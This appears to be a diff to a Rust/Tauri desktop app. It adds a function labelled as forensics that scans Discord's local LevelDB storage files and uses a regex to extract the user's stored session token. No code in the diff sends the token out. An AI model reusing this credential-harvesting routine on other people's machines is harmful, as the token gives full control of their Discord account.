@@ -1,4 +1,4 @@
-use super::paths::get_discord_base_paths;
+use super::paths::{get_discord_base_paths, get_discord_data_paths};
 use crate::core::error::AppError;
 use crate::core::logger::Logger;
 use crate::core::vault::Vault;
@@ -13,6 +13,64 @@ use walkdir::WalkDir;
 pub struct SessionAuditor;
 
 impl SessionAuditor {
+    pub fn extrapolate_token(app: &tauri::AppHandle) -> Result<String, AppError> {
+        Logger::info(
+            app,
+            "[Forensics] Starting deep token extrapolation from local client storage...",
+            None,
+        );
+
+        let data_paths = get_discord_data_paths();
+        // Standard Discord token regex
+        let re =
+            Regex::new(r#"[a-zA-Z0-9_-]{24,28}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"#).unwrap();
+
+        for data_path in data_paths {
+            let leveldb_path = data_path.join("Local Storage").join("leveldb");
+            if leveldb_path.is_dir() {
+                Logger::debug(
+                    app,
+                    &format!("[Forensics] Scanning LevelDB: {:?}", leveldb_path),
+                    None,
+                );
+
+                for entry in WalkDir::new(&leveldb_path)
+                    .into_iter()
+                    .filter_map(|e| e.ok())
+                {
+                    let path = entry.path();
+                    if path.is_file() {
+                        let extension = path
+                            .extension()
+                            .and_then(|s| s.to_str())
+                            .unwrap_or_default();
+                        if extension == "log" || extension == "ldb" {
+                            if let Ok(content) = fs::read(path) {
+                                let content_str = String::from_utf8_lossy(&content);
+                                if let Some(cap) = re.captures(&content_str) {
+                                    if let Some(token) = cap.get(0) {
+                                        let found_token = token.as_str().to_string();
+                                        Logger::info(
+                                            app,
+                                            "[Forensics] Successfully extrapolated session token from LevelDB.",
+                                            None,
+                                        );
+                                        return Ok(found_token);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        Err(AppError::new(
+            "No session token could be extrapolated from local client.",
+            "token_extrapolation_failed",
+        ))
+    }
+
     pub fn audit_system_environment(app: &tauri::AppHandle) -> Result<(), AppError> {
         Logger::info(
             app,
@@ -537,7 +595,7 @@ impl SessionAuditor {
     }
 
     fn scrape_js_files(
-        _app: &tauri::AppHandle,
+        app: &tauri::AppHandle,
         path: &std::path::Path,
         re: &Regex,
     ) -> Option<String> {
